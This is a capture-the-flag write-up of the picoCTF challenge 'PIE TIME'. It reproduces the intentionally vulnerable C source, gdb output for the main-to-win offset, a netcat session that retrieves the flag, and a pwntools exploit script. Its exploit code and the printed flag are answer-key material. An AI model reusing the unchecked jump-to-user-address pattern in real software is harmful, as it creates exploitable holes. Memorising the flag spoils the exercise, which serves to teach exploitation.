# picoGym Level 490: PIE TIME
Source: https://play.picoctf.org/practice/challenge/490

## Goal
Can you try to get the flag? Beware we have PIE!<br>
Connect to the program with netcat:<br>
nc rescued-float.picoctf.net 50004<br>
The program's source code can be downloaded here.<br>
https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln.c<br>
The binary can be downloaded here.<br>
https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln

## What I learned
```
Binary exploitation
PIE (Position Independent Executable) enable:     randomizes memory address on each execution

Note: Distance (offset) between two functions is fixed
    Calculate local address of main
    Then remotely subtract the offset and consequently jump to the win function containing the flag

gdb
    p/x &main - &win
gef
pwndbg
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ wget https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln.c https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln ⌨️
--2025-10-01 22:59:11--  https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln.c
Resolving challenge-files.picoctf.net (challenge-files.picoctf.net)... 3.160.5.95, 3.160.5.40, 3.160.5.64, ...
Connecting to challenge-files.picoctf.net (challenge-files.picoctf.net)|3.160.5.95|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862 [application/octet-stream]
Saving to: 'vuln.c'

vuln.c                                                     100%[======================================================================================================================================>]     862  --.-KB/s    in 0s      

2025-10-01 22:59:11 (414 MB/s) - 'vuln.c' saved [862/862]

--2025-10-01 22:59:11--  https://challenge-files.picoctf.net/c_rescued_float/bdb6bf774358f0bb2ad5aca6142f72287773518e274f1dd724cde2e49a44aaa4/vuln
Reusing existing connection to challenge-files.picoctf.net:443.
HTTP request sent, awaiting response... 200 OK
Length: 17264 (17K) [application/octet-stream]
Saving to: 'vuln'

vuln                                                       100%[======================================================================================================================================>]  16.86K  --.-KB/s    in 0.001s  

2025-10-01 22:59:11 (27.4 MB/s) - 'vuln' saved [17264/17264]

FINISHED --2025-10-01 22:59:11--
Total wall clock time: 0.2s
Downloaded: 2 files, 18K in 0.001s (28.7 MB/s)
AsianHacker-picoctf@webshell:~$ chmod u+x vuln ⌨️
AsianHacker-picoctf@webshell:~$ file vuln ⌨️
vuln: ELF 64-bit LSB pie executable 👀, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

AsianHacker-picoctf@webshell:~$ cat vuln.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r"); 👀
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();

# Method 1:
AsianHacker-picoctf@webshell:~$ gdb -q vuln ⌨️
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions ⌨️
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  puts@plt
0x0000000000001110  fclose@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  fgetc@plt
0x0000000000001150  signal@plt
0x0000000000001160  setvbuf@plt
0x0000000000001170  fopen@plt
0x0000000000001180  __isoc99_scanf@plt
0x0000000000001190  exit@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
0x0000000000001289  segfault_handler
0x00000000000012a7  win 👀
0x000000000000133d  main 👀
0x0000000000001410  __libc_csu_init
0x0000000000001480  __libc_csu_fini
0x0000000000001488  _fini
(gdb) p/x &main - &win ⌨️⭐⭐⭐⭐⭐
$1 = 0x96 👀
(gdb) exit ⌨️

# Method 1:
# Note: Use Calculator with hex mode enabled ❤️❤️❤️❤️❤️
# Note: Remove 0x
https://www.calculator.net/hex-calculator.html?number1=57bfad43c33d&c2op=-&number2=96&calctype=op&x=Calculate


AsianHacker-picoctf@webshell:~$ nc rescued-float.picoctf.net 50004 ⌨️
Address of main: 0x57bfad43c33d
Enter the address to jump to, ex => 0x12345: 0x57BFAD43C2A7 ⌨️
Your input: 57bfad43c2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5} 🔐

# Method (Still Working): Local Exploit not remote
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./vuln", checksec=False)  
p = process()  

offset = elf.symbols['main'] - elf.symbols['win']  

line = p.recvline().decode().strip()  
leaked_main = int(line.split("Address of main: ")[1], 16)  

addr_win_pie = leaked_main - offset  

p.sendline(hex(addr_win_pie).encode()) 

print(p.recvall().decode())

AsianHacker-picoctf@webshell:~$ python3 pythonScript.py 
Enter the address to jump to, ex => 0x12345: Your input: 55cb851f12a7
You won!
picoCTF{win}
```

## Flag
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5}

## Continue
[Continue](./picoGym0490.md)